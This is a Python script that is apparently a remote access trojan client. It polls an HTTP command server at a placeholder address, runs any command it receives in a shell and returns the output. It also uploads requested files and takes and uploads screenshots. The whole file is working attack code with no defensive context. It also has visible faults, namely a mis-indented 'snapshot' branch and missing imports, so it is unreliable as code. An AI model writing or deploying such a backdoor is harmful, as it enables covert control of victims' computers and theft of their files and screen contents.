import requests
import subprocess
import time
import os
import platform

while True:

    req = requests.get('http://127.0.0.1')
    command = req.text

    if 'terminate' in command:
        break

    elif command[:2] == 'cd':
        if command == 'cd':
            post_response = requests.post(url='http://127.0.0.1', data=os.getcwd()+'> ')
            pass
        else:
            try:
                if command[2] == ' ':
                    os.chdir(command[3:])
                    post_response = requests.post(url='http://127.0.0.1', data=os.getcwd() + '> ')
                elif command[2] == '.':
                    os.chdir(command[2:])
                    post_response = requests.post(url='http://127.0.0.1', data=os.getcwd() + '> ')
                else:
                    post_response = requests.post(url='http://127.0.0.1',
                                                  data='[-] ERROR')
            except:
                post_response = requests.post(url='http://127.0.0.1',
                                              data='[-] The system cannot find the path specified.')

    elif 'grab' in command:
        grab, path = command.split(' ',1)

        if os.path.exists(path):
            url = 'http://127.0.0.1/store'  # "/store" indicate that we'll transfer a file
            files = {'file': open(path, 'rb')}
            post_response = requests.post(url, files=files)

        else:
            post_response = requests.post(url='http://127.0.0.1', data='[-] Unable to find the file !')
     
     elif command == 'snapshot':
        
        path = tempfile.mkdtemp()  #Create a temp dir to store our snapshot 

        ImageGrab.grab().save( path + "\img.jpg", "JPEG")  #Save the snapshot in the temp dir

        url = 'http://127.0.0.1/store'                   
        files = {'file': open(path + "\img.jpg", 'rb')}
        r = requests.post(url, files=files)                 #Transfer the file over our HTTP
        
        files['file'].close()   #Once the file gets transfered, close the file.
        shutil.rmtree(path)  #Remove the entire temp dir

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stdout.read())
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stderr.read())

        time.sleep(2)
